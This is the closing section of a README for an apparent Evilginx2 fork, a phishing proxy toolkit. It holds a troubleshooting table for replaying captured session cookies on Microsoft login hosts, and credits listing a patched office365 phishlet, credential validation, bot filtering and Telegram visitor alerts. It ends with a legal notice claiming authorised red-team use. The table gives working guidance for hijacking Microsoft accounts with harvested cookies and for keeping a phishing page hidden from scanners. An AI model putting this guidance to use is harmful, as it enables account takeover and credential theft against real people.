| Imported cookies don't log in | jar incomplete | check `cookies_complete`; redo the capture; click "Stay signed in" |
| Cookie-Editor "invalid format" | paste missing `[` `]` | `cat cookies-import.json \| tr -d '\n'` then triple-click, or scp the file |
| Red page after import | wrong host, or incomplete jar | import on `login.microsoftonline.com` |
| Logs out after a minute | session cookies only | redo capture, click "Stay signed in" → Yes |
| `__Host-` cookie rejected | mismatched domain | import on the exact host, then open `login.live.com` once |
| `validProxyTypes redeclared` | declared in both files | delete it from `config_proxy.go` |
| Cert issuance times out on enable | ACME slow on 16 hosts | `test-certs` in the console |
| Panel unreachable | bound to localhost | it binds `0.0.0.0`; check the firewall |
| Panel login rejected after `.env` edit | used `restart` | `docker compose up -d` |
| Bot filter blocks a real visitor | unusual UA | `BOT_FILTER=0` and restart |

---

# 👏 Credits

| Contribution | Author |
|:--|:--|
| Original Evilginx2 core | **Kuba Gretzky ([@kgretzky](https://github.com/kgretzky))** |
| Telegram integration, panels, GeoIP, credential validation, CSS randomisation, extension detection, header stripping, URL rewriting, dynamic spoofing, bot filtering, visitor alerts, retention, backups | **Official Monsterz** — [t.me/officialmonsterz](https://t.me/officialmonsterz) · [github.com/officialmonsterz](https://github.com/officialmonsterz) · shapads@tutamail.com |
| DOM injection engine, `rewrite_urls`, multi-scope tunnelling proxies, cookie capture/export rebuild, completeness verification, thread-safety hardening | this fork |
| Phishlet patcher, validator, cookie converter, A-to-Z deployment guide, fixed `office365` phishlet | this fork |

**Reach the original author of the phishlet work and the panel/Telegram stack:**

- Telegram: [t.me/officialmonsterz](https://t.me/officialmonsterz)
- GitHub: [github.com/officialmonsterz](https://github.com/officialmonsterz)
- Email: shapads@tutamail.com

If this saved you a week, go and thank the people who built the parts this stands on.

---

# ⚠️ Legal Notice

Dual-use tool intended for authorised penetration testing, security research, red-team engagements under signed RoE, and accredited education. Not for unauthorised access, identity theft, credential harvesting or fraud. You accept full legal responsibility for your use.

---

<p align="center">
  <b>If this repo saved you time, star it — it's the only signal that keeps it maintained.</b>
</p>

<p align="center">
  <sub>Built by red teamers, for red teamers. Based on the pioneering work of <a href="https://t.me/officialmonsterz">Official Monsterz</a> and <a href="https://github.com/kgretzky">Kuba Gretzky</a>. Licensed under BSD 3-Clause.</sub>
</p>
